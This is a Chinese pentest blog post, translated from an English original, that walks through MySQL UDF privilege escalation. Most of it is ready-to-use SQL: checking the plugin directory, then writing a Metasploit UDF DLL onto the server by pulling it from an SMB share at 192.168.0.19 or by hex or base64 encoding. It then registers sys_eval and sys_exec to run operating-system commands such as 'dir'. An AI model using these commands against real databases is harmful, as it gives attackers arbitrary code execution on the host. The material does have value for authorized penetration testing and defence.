Title: MySql UDF提权
Category: Pentest
slug: mysql-udf-privilege-escalation
Date: 2020-07-29

翻译: <https://osandamalith.com/2018/02/11/mysql-udf-exploitation>
MSF的dll: <https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql>

###0x01 准备工作
先检查运行的mysql结构:

```
select @@version_compile_os, @@version_compile_machine;
show variables like '%compile%';
```

结果如下:

```bash
MySQL [(none)]> select @@version_compile_os, @@version_compile_machine;
+----------------------+---------------------------+
| @@version_compile_os | @@version_compile_machine |
+----------------------+---------------------------+
| Win64                | x86_64                    |
+----------------------+---------------------------+
MySQL [(none)]> show variables like '%compile%';
+-------------------------+--------+
| Variable_name           | Value  |
+-------------------------+--------+
| version_compile_machine | x86_64 |
| version_compile_os      | Win64  |
+-------------------------+--------+
```

在`Mysql 5.0.67`版本开始，UDF的文件必须放在mysql的插件目录: `select @@plugin_dir;`

可以在开启mysql的时候设置plugin的目录:

```
指定目录:
mysqld.exe –plugin-dir=C:\\temp\\plugins\\

指定配置文件:
mysqld.exe --defaults-file=C:\\temp\\my.ini

配置文件包括如下内容:
[mysqld]
plugin_dir = C:\\temp\\plugins\\
```

老版本的Mysql搜索UDF路径是按照如下的顺序来的:

* @@datadir
* @@basedir\bin
* C:\windows
* C:\windows\system
* C:\windows\system32

###上传UDF的文件

####0x01 网络共享写文件

```
select load_file('\\\\192.168.0.19\\network\\lib_mysqludf_sys_64.dll') into dumpfile "D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll";
```

####0x02 十六进制

```
xxd -plain /tmp/udf.dll | tr -d '\n' > /tmp/dll.hex 转换为16进制
use mysql;
set @a=concat('', 0x<hex_of_exe>);
create table tmp(data LONGBLOB);
insert into tmp values("");
update tmp set data = @a;
select data from tmp into DUMPFILE <dir>;
create function sys_eval returns string soname 'sys_eval.dll';

drop table tmp;
drop function sys_eval; 
```
####0x03 网络共享+16进制

```
load data infile '\\\\192.168.0.19\\network\\udf.hex' 
into table temp fields terminated by '@OsandaMalith' 
lines terminated by '@OsandaMalith' (data);

select unhex(data) from temp into dumpfile 'D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll';
```

####0x04 base64写入

```
//先转换为base64;
select to_base64(load_file('/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll')) 
into dumpfile '/tmp/udf.b64';

//再写入:
select from_base64("TVqQAAMAAAAEAAAAA") 
into dumpfile "D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll";

或者写入到大表里面，再写入到文件:
select from_base64(data) from temp 
into dumpfile 'D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-winx64\\lib\\plugin\\udf.dll';
```

###Exploit

msf自带的udf提供的几个函数，主要用到的是`sys_eval`和`sys_exec`,实测`sys_exec`会把mysql崩溃，可能创建的时候返回了string，建议使用`sys_eval`:

####sys_exec

```
创建函数:
create function sys_exec returns int soname 'udf.dll';

确定是否成功:
select * from mysql.func where name = 'sys_exec';

删除函数:
drop function sys_exec;
```

####sys_eval

```
创建函数:
create function sys_eval returns string soname 'udf.dll';

确定是否成功:
select * from mysql.func where name = 'sys_eval';

删除:
drop function sys_eval;

使用:
select sys_eval('dir');
```


####sys_get

```
create function sys_get returns string soname 'udf.dll';
Drop function sys_get;

//获取环境变量
Select sys_get('longonserver');
```

>I noticed that these external UDF functions do not have proper exception handling in the dissembled code. Hence, a slightest mistake while calling these functions will lead the mysqld.exe server to crash. I hope this article might be useful to you while pentesting MySQL.

